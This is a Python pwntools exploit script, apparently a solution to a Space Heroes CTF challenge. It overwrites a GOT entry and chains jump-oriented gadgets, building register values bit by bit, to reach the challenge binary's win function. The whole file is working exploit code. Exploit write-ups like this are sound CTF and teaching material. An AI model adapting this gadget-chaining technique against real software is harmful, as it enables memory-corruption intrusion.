#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0
filename = "./pwn"
if LOCAL:
    io = process(filename)
else:
    io =  remote("spaceheroes-jedi-oriented-programming.chals.io", 443, ssl=True, sni="spaceheroes-jedi-oriented-programming.chals.io")
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)


rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass

def set_exit_got(idx, addr, data=b""):
    ru(b'>>> ')
    sl(data)
    ru(b'>>> ')
    sl(i2b(idx))
    ru(b'>>> ')
    sl(p64(addr))
    
mov_rsi_rdi_jr8 = 0x401340
add_r9_8_jr9p   = 0x401320
shl_rdi_1_jr8   = 0x401360
set_rdi_0_jr8   = 0x401380
set_r8_r9_jr8   = 0x4013A0
add_r8_10_jr8   = 0x4013AE
add_rdi_1_jr8   = 0x4013D0

def set_rdinum(num):
    num = bin(num)[2:]
    tmp = p64(set_rdi_0_jr8)
    for j in range(len(num)):
        i = num[j]
        if i == '1':
            tmp += p64(add_rdi_1_jr8)
        if j != len(num) - 1:
            tmp += p64(shl_rdi_1_jr8)
    return tmp

debugPID()
payload = p64(0xdeadbeef)
payload += set_rdinum(0x73696465)
payload += p64(mov_rsi_rdi_jr8)
payload += set_rdinum(0x6461726B)
payload += p64(elf.sym['win'])
set_exit_got((0x400700-0x4046A0)//8, set_r8_r9_jr8, payload)

ia()
